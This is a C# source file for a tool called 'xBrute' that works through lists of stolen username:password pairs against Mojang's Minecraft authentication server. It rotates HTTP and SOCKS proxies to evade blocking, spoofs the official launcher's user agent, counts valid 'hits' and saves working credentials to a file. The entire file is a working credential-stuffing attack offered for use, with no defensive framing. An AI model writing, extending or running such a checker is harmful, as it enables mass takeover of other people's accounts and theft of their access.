using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace xBrute
{
    class Request
    {
        public static int badCounter = 0;
        public static int Expired = 0;
        public static int hitCounter = 0;
        public static int errorCounter = 0;
        public static int totalCounter = 0;
        public static int checkedCounter = 0;
        public static int comboNumber = 0;
        public static List<string> proxyList = new List<string>();
        public static int proxyNumber = 0;
        public static int threads;
        public static string proxyType;
        public static int proxyTotalCounter = 0;
        public static int stopCount = 0;
        public static List<string> comboList = new List<string>();
        public static int CPM = 0;
        public static int CPM_aux = 0;
        public static string hitCombos;
        public static string badCombos;
        public static int retriecounter;

        public static int nfaCounter;
        public static int sfaCounter;
        public static int demoCounter;

        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            Request.totalCounter++;
                        }
                    }
                }
            }
        }

        public static void Loadproxies(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            Request.proxyTotalCounter++;
                        }
                    }
                }
            }
        }

        public static void updateTitle()
        {
            for (; ; )
            {
                Request.CPM = Request.CPM_aux;
                Request.CPM_aux = 0;
                Colorful.Console.Title = string.Format("xBrute v0.02- Checked: {0} ~ Hits: {1} ~ NFA: {2} ~ SFA: {3} ~ Retires: {4} ~ Errors: {5} ~ CPM: ", new object[]
                {
                    Request.checkedCounter,
                    Request.hitCounter,
                    Request.nfaCounter,
                    Request.sfaCounter,
                    Request.retriecounter,
                    Request.errorCounter,
                }) + Request.CPM * 60;
                Thread.Sleep(1000);
            }
        }

        public static void Check()
        {
            int retries = 2;
            for (int i = 0; i < retries + 1; i++)
            {
                for (; ; )
                {
                    if (Request.proxyNumber > Request.proxyList.Count<string>() - 2)
                        Request.proxyNumber = 0;
                    try
                    {
                        Interlocked.Increment(ref Request.proxyNumber);
                        using (HttpRequest req = new HttpRequest())
                        {
                            if (Request.comboNumber > Request.comboList.Count<string>())
                            {
                                ++Request.stopCount;
                                break;
                            }
                            Interlocked.Increment(ref Request.comboNumber);
                            string[] strArray = Request.comboList[Request.comboNumber].Split(':');
                            string str1 = strArray[0] + ":" + strArray[1];
                            try
                            {
                                req.IgnoreProtocolErrors = true;
                                req.KeepAlive = true;

                                if (Request.proxyType == "HTTP")
                                    req.Proxy = (ProxyClient)HttpProxyClient.Parse(Request.proxyList[Request.proxyNumber]);
                                if (Request.proxyType == "SOCKS4")
                                    req.Proxy = (ProxyClient)Socks4ProxyClient.Parse(Request.proxyList[Request.proxyNumber]);
                                if (Request.proxyType == "SOCKS5")
                                    req.Proxy = (ProxyClient)Socks5ProxyClient.Parse(Request.proxyList[Request.proxyNumber]);

                                req.UserAgent = "Minecraft Launcher/2.1.1351 (6371f5d03a) Windows (10.0; x86)";
                                req.AddHeader("Accept", "application/json, text/plain, */*");

                                string post = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"" + strArray[0] + "\",\"password\":\"" + strArray[1] + "\",\"requestUser\":true}";

                                string str2 = req.Post("https://authserver.mojang.com/authenticate", post, "application/json;charset=UTF-8").ToString();


                                if (str2.Contains("Invalid credentials") || str2.Contains("error\":\"ForbiddenOperationException") || str2.Contains("403"))
                                {

                                    Request.CPM_aux++;
                                    Request.checkedCounter++;
                                    Request.badCounter++;
                                }
                                else if (str2.Contains("accessToken"))
                                {
                                    try
                                    {
                                        Request.CPM_aux++;
                                        Request.checkedCounter++;
                                        Request.hitCounter++;
                                        Colorful.Console.WriteLine("[HIT] ", strArray[0] + ":" + strArray[1], Color.Green);
                                        Hits(str1);
                                    }
                                    catch
                                    {
                                        Colorful.Console.WriteLine("[ERROR] ", strArray[0] + ":" + strArray[1], Color.Red);
                                    }
                                }




                                else
                                {
                                    retriecounter++;
                                    Request.comboList.Add(str1);
                                }

                            }
                            catch (Exception ex)
                            {
                                Interlocked.Increment(ref Request.errorCounter);
                                Request.comboList.Add(str1);
                            }
                        }
                        continue;
                    }
                    catch (Exception ex)
                    {
                        Interlocked.Increment(ref Request.errorCounter);
                    }
                }
            }
        }


        public static void Hits(string account)
        {
            try
            {
                Directory.CreateDirectory("Brute_Mode_Results");
                using (StreamWriter sw = File.AppendText("/Brute.txt"))
                {
                    sw.WriteLine(account);
                }
            }
            catch
            {

            }
        }







        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }




    }
}
